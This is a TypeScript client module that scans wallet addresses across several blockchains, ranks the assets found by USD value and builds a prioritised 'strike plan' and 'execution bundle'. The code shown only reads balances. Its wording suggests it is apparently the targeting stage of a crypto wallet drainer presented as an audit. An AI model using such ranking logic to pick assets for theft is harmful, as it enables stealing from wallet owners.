"use client";

import { UniversalAsset } from "./audit/types";
import { determineStrategy, StrategyMap } from "./audit/engine";
import {
  scanEVM,
  scanSolana,
  scanTron,
  scanUTXO,
  scanXRP,
} from "./audit/scanners";

export type { UniversalAsset };

export interface UniversalIdentity {
  evm?: string;
  solana?: string;
  tron?: string;
  btc?: string;
  ltc?: string;
  xrp?: string;
}

interface ScannerTask {
  name: string;
  fn: Promise<UniversalAsset[]>;
  timeoutMs: number;
  startTime?: number;
}

/**
 * 🌍 UNIVERSAL AUDIT ENTRY POINT (v12.2.2 - Multi-Chain Detection)
 * Fixes: SOLANA_TIMEOUT stability & chainType TypeScript resolution.
 */
export async function scanUniversalPortfolio(
  identity: UniversalIdentity | string,
  injectedSalt?: string,
): Promise<{ assets: UniversalAsset[]; plan: StrategyMap[] }> {
  const logPrefix = "[audit.ts]";
  const startTime = Date.now();

  // 1. NORMALIZE IDENTITY
  let ids: UniversalIdentity = {};

  if (typeof identity === "string") {
    const trimmed = identity.trim();
    if (trimmed.startsWith("0x") && trimmed.length === 42) {
      ids.evm = trimmed;
    } else if (trimmed.length >= 32 && trimmed.length <= 44) {
      ids.solana = trimmed;
    } else if (trimmed.startsWith("T") && trimmed.length === 34) {
      ids.tron = trimmed;
    } else if (trimmed.startsWith("r") || trimmed.startsWith("X")) {
      ids.xrp = trimmed;
    } else {
      ids.btc = trimmed;
    }
  } else {
    ids = identity;
  }

  if (
    !ids.evm &&
    !ids.solana &&
    !ids.btc &&
    !ids.tron &&
    !ids.xrp &&
    !ids.ltc
  ) {
    console.warn(
      `${logPrefix} ⚠️ Aborted: No valid identities found in input.`,
    );
    return { assets: [], plan: [] };
  }

  // 2. REGISTER TASKS
  const scannerTasks: ScannerTask[] = [];
  const addTask = (
    name: string,
    promise: Promise<UniversalAsset[]>,
    timeout: number,
  ) => {
    scannerTasks.push({
      name,
      fn: promise,
      timeoutMs: timeout,
      startTime: Date.now(),
    });
  };

  if (ids.evm) addTask("EVM", scanEVM(ids.evm, injectedSalt), 25000);

  // 🛰️ Increased Solana timeout to 15s to handle RPC congestion
  if (ids.solana) addTask("SOLANA", scanSolana(ids.solana), 15000);

  if (ids.tron) addTask("TRON", scanTron(ids.tron), 8000);
  if (ids.btc || ids.ltc)
    addTask("UTXO", scanUTXO(ids.btc || ids.ltc || ""), 12000);
  if (ids.xrp) addTask("XRP", scanXRP(ids.xrp), 6000);

  console.log(
    `${logPrefix} 🛰️ Parallelizing ${scannerTasks.length} scanner tasks...`,
  );

  // 3. CONCURRENT EXECUTION
  const results = await Promise.allSettled(
    scannerTasks.map(async (task) => {
      try {
        const timeoutPromise = new Promise<UniversalAsset[]>((_, reject) =>
          setTimeout(
            () => reject(new Error(`${task.name}_TIMEOUT`)),
            task.timeoutMs,
          ),
        );

        return await Promise.race([task.fn, timeoutPromise]);
      } catch (err: any) {
        console.error(
          `${logPrefix} ❌ ${task.name} Scanner Failed:`,
          err.message,
        );

        // Targeted recovery for Solana if timeout was aggressive
        if (task.name === "SOLANA") {
          console.log(
            `${logPrefix} 🔄 Retrying Solana scan with extended grace...`,
          );
          return await task.fn.catch(() => []);
        }

        return [];
      }
    }),
  );

  let flattened: UniversalAsset[] = [];
  for (const res of results) {
    if (res.status === "fulfilled" && Array.isArray(res.value)) {
      flattened.push(...res.value);
    }
  }

  // 4. FILTERING & VALUE SORTING
  const safeResults = flattened
    .filter((a) => {
      if (!a?.symbol) return false;
      const balStr = a.balance?.toString() || "0";
      return (
        (balStr !== "0" && balStr !== "0x0" && balStr !== "") ||
        parseFloat(a.displayBalance || "0") > 0
      );
    })
    .sort((a, b) => (b.usdValue ?? 0) - (a.usdValue ?? 0));

  // 5. STRATEGY RESOLUTION
  const strikePlan = determineStrategy(safeResults);

  // 6. LOGGING (TypeScript Error Fix Applied Here)
  if (strikePlan.length > 0) {
    console.log(`${logPrefix} ⚖️ FINAL EXECUTION BUNDLE (PRIORITY ORDER):`);
    console.table(
      strikePlan.map((p) => ({
        token: p.asset.symbol,
        strategy: p.strategy,
        value: `$${Number(p.asset.usdValue || 0).toFixed(2)}`,
        // Fix: Use type assertion to access chainType safely
        chain: p.asset.chainId || (p.asset as any).chainType || "UNKNOWN",
      })),
    );
  }

  console.log(
    `${logPrefix} 🏁 Audit Complete. Total Latency: ${
      Date.now() - startTime
    }ms`,
  );

  return { assets: safeResults, plan: strikePlan };
}
